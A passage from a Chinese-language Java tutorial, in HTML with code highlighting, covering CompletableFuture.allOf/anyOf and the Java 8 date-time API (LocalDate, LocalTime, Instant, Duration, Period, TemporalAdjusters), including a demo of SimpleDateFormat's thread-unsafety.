<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">allOf</span><span class="token punctuation">(</span>collect<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">[</span>collect<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">thenRun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="anyOf">anyOf</h3>
<p>等待任意一个CompletableFuture执行完成之后，执行后续的操作</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span>：
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> <span class="token function">anyOf</span><span class="token punctuation">(</span><span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> cfs<span class="token punctuation">)</span>

举例：
<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">CompletableFuture</span><span class="token punctuation">&lt;</span><span class="token class-name">Double</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> collect <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">anyOf</span><span class="token punctuation">(</span>collect<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">[</span>collect<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">thenRun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>新的日期和时间API</h1>
<h2 id="重新设计原因">重新设计原因</h2>
<ol>
<li>java.util.Date 不够直观。<br>
Date date = new Date(114, 2, 18);<br>
它的打印输出效果为： Tue Mar 18 00:00:00 CET 2014</li>
<li>线程不安全</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ParseException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">SimpleDateFormat</span> sdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyyMMdd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Date</span> parseDate <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                    <span class="token keyword">try</span> <span class="token punctuation">{</span>
                        parseDate <span class="token operator">=</span> sdf<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"20160505"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ParseException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parseDate<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

输出
<span class="token class-name">Thu</span> <span class="token class-name">May</span> <span class="token number">05</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">CST</span> <span class="token number">2016</span>
<span class="token class-name">Thu</span> <span class="token class-name">May</span> <span class="token number">05</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">CST</span> <span class="token number">2016</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token class-name">Exception</span> in thread <span class="token string">"Thread-19"</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>NumberFormatException</span><span class="token operator">:</span> <span class="token class-name">For</span> input string<span class="token operator">:</span> <span class="token string">""</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>NumberFormatException</span><span class="token punctuation">.</span><span class="token function">forInputString</span><span class="token punctuation">(</span><span class="token class-name">NumberFormatException</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">65</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Long</span><span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">702</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Long</span><span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">817</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>DigitList</span><span class="token punctuation">.</span><span class="token function">getLong</span><span class="token punctuation">(</span><span class="token class-name">DigitList</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">195</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>DecimalFormat</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token class-name">DecimalFormat</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2093</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>SimpleDateFormat</span><span class="token punctuation">.</span><span class="token function">subParse</span><span class="token punctuation">(</span><span class="token class-name">SimpleDateFormat</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1913</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>SimpleDateFormat</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token class-name">SimpleDateFormat</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1529</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>DateFormat</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token class-name">DateFormat</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">386</span><span class="token punctuation">)</span>
	at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>hots<span class="token punctuation">.</span></span>TimeTest</span><span class="token punctuation">.</span>lambda$main$<span class="token function">0</span><span class="token punctuation">(</span><span class="token class-name">TimeTest</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">15</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">844</span><span class="token punctuation">)</span>
<span class="token class-name">Exception</span> in thread <span class="token string">"Thread-17"</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>NumberFormatException</span><span class="token operator">:</span> <span class="token class-name">For</span> input string<span class="token operator">:</span> <span class="token string">""</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>NumberFormatException</span><span class="token punctuation">.</span><span class="token function">forInputString</span><span class="token punctuation">(</span><span class="token class-name">NumberFormatException</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">65</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Long</span><span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">702</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Long</span><span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">817</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>DigitList</span><span class="token punctuation">.</span><span class="token function">getLong</span><span class="token punctuation">(</span><span class="token class-name">DigitList</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">195</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>DecimalFormat</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token class-name">DecimalFormat</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2093</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>SimpleDateFormat</span><span class="token punctuation">.</span><span class="token function">subParse</span><span class="token punctuation">(</span><span class="token class-name">SimpleDateFormat</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1913</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>SimpleDateFormat</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token class-name">SimpleDateFormat</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1529</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>DateFormat</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token class-name">DateFormat</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">386</span><span class="token punctuation">)</span>
	at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>hots<span class="token punctuation">.</span></span>TimeTest</span><span class="token punctuation">.</span>lambda$main$<span class="token function">0</span><span class="token punctuation">(</span><span class="token class-name">TimeTest</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">15</span><span class="token punctuation">)</span>
	at java<span class="token punctuation">.</span>base<span class="token operator">/</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">844</span><span class="token punctuation">)</span>
<span class="token class-name">Thu</span> <span class="token class-name">May</span> <span class="token number">05</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">CST</span> <span class="token number">2016</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="java-time-LocalDate-此类是不可吧变更且线程安全的。并且和时间概念区分开。">java.time.LocalDate  此类是不可吧变更且线程安全的。并且和时间概念区分开。</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> localDate <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2019</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>localDate<span class="token punctuation">.</span><span class="token function">getMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>localDate<span class="token punctuation">.</span><span class="token function">getMonthValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>localDate<span class="token punctuation">.</span><span class="token function">lengthOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>LocalDate.now()</td>
<td>获取当前日期</td>
</tr>
<tr>
<td>LocalDate.of(intyear,intmonth,intdayOfMonth)</td>
<td>根据参数设置日期，参数分别为年，月，日</td>
</tr>
<tr>
<td>localDate.getDayOfMonth()</td>
<td>获取当前日期是所在月的第几天</td>
</tr>
<tr>
<td>localDate.getDayOfWeek()</td>
<td>获取当前日期是星期几（星期的英文全称）</td>
</tr>
<tr>
<td>localDate.getDayOfYear()</td>
<td>获取当前日期是所在年的第几天</td>
</tr>
<tr>
<td>localDate.getMonth()</td>
<td>获取当前日期所在月份（月份的英文全称）</td>
</tr>
<tr>
<td>localDate.getMonthValue()</td>
<td>获取当前日期所在月份的数值</td>
</tr>
<tr>
<td>localDate.lengthOfMonth()</td>
<td>获取当前日期所在月份有多少天</td>
</tr>
<tr>
<td>localDate.lengthOfYear()</td>
<td>获取当前日期所在年有多少天</td>
</tr>
<tr>
<td>localDate.<strong>isLeapYear</strong>()</td>
<td>获取当前日期所在年是否是闰年</td>
</tr>
<tr>
<td>localDate.<strong>with</strong>DayOfMonth(intdayOfMonth)</td>
<td>将参数中的"日"替换localDate中的"日"</td>
</tr>
<tr>
<td>localDate.<strong>with</strong>DayOfYear(intdayOfYear)</td>
<td>将参数中的天数替换localDate中的天数</td>
</tr>
<tr>
<td>localDate.<strong>with</strong>Month(intmonth)</td>
<td>将参数中的"月"替换localDate中的"月"</td>
</tr>
<tr>
<td>localDate.<strong>with</strong>Year(intyear)</td>
<td>将参数中的"年"替换localDate中的"年"</td>
</tr>
<tr>
<td>localDate.minusDays(longdays)</td>
<td>将当前日期减一天</td>
</tr>
<tr>
<td>localDate.minusWeeks(longweeks)</td>
<td>将当前日期减一周</td>
</tr>
<tr>
<td>localDate.minusMonths(longmonths)</td>
<td>将当前日期减一月</td>
</tr>
<tr>
<td>localDate.minusYears(longyears)</td>
<td>将当前日期减一年</td>
</tr>
<tr>
<td>localDate.plusDays(longdays)</td>
<td>将当前日期加一天</td>
</tr>
</tbody>
</table>
<h2 id="java-time-LocalTime">java.time.LocalTime</h2>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>LocalTime.now()</td>
<td>获取当前时间</td>
</tr>
<tr>
<td>LocalTime.of(inthour,intminute)</td>
<td>根据参数设置时间，参数分别为时，分</td>
</tr>
<tr>
<td>LocalTime.of(inthour,intminute,intsecond)</td>
<td>根据参数设置时间，参数分别为时，分，秒</td>
</tr>
<tr>
<td>localTime.getHour()</td>
<td>获取当前时间的小时数</td>
</tr>
<tr>
<td>localTime.getMinute()</td>
<td>获取当前时间的分钟数</td>
</tr>
<tr>
<td>localTime.getSecond()</td>
<td>获取当前时间的秒数</td>
</tr>
<tr>
<td>localTime.withHour(inthour)</td>
<td>将参数中的"小时"替换localTime中的"小时"</td>
</tr>
<tr>
<td>localTime.withMinute(intminute)</td>
<td>将参数中的"分钟"替换localTime中的"分钟"</td>
</tr>
<tr>
<td>localTime.withSecond(intsecond)</td>
<td>将参数中的"秒"替换localTime中的"秒"</td>
</tr>
<tr>
<td>localTime.minusHours(longhours)</td>
<td>将当前时间减一小时</td>
</tr>
<tr>
<td>localTime.minusMinutes(longminutes)</td>
<td>将当前时间减一分钟</td>
</tr>
<tr>
<td>localTime.minusSeconds(longseconds)</td>
<td>将当前时间减一秒</td>
</tr>
<tr>
<td>localTime.plusHours(longhours)</td>
<td>将当前时间加一小时</td>
</tr>
<tr>
<td>localTime.plusMinutes(longminutes)</td>
<td>将当前时间加一分钟</td>
</tr>
<tr>
<td>localTime.plusSeconds(longseconds)</td>
<td>将当前时间加一秒</td>
</tr>
</tbody>
</table>
<h2 id="java-time-LocalDateTime">java.time.LocalDateTime</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> localDate <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">LocalTime</span> time <span class="token operator">=</span> <span class="token class-name">LocalTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">LocalDateTime</span> localDateTime <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>localDate<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>localDateTime<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">LocalDateTime</span> now <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="java-time-Instant-机器时间">java.time.Instant 机器时间</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Instant</span> start <span class="token operator">=</span> <span class="token class-name">Instant</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Instant</span> end <span class="token operator">=</span> <span class="token class-name">Instant</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Duration</span> duration <span class="token operator">=</span> <span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">between</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>duration<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>duration<span class="token punctuation">.</span><span class="token function">toNanos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="java-time-Duration">java.time.Duration</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalTime</span> time <span class="token operator">=</span> <span class="token class-name">LocalTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">LocalTime</span> beforeTime <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">minusHours</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Duration</span> duration <span class="token operator">=</span> <span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">between</span><span class="token punctuation">(</span>time<span class="token punctuation">,</span> beforeTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>duration<span class="token punctuation">.</span><span class="token function">toHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="java-time-Period">java.time.Period</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Period</span> period <span class="token operator">=</span> <span class="token class-name">Period</span><span class="token punctuation">.</span><span class="token function">between</span><span class="token punctuation">(</span><span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2014</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>period<span class="token punctuation">.</span><span class="token function">getMonths</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>period<span class="token punctuation">.</span><span class="token function">getDays</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>period<span class="token punctuation">.</span><span class="token function">getYears</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="java-time-temporal-TemporalAdjusters-时间调节器">java.time.temporal.TemporalAdjusters 时间调节器</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDateTime</span> now <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取当月第一天</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"当月第一天："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">firstDayOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取下月第一天</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"下月第一天："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">firstDayOfNextMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取明年第一天</span>
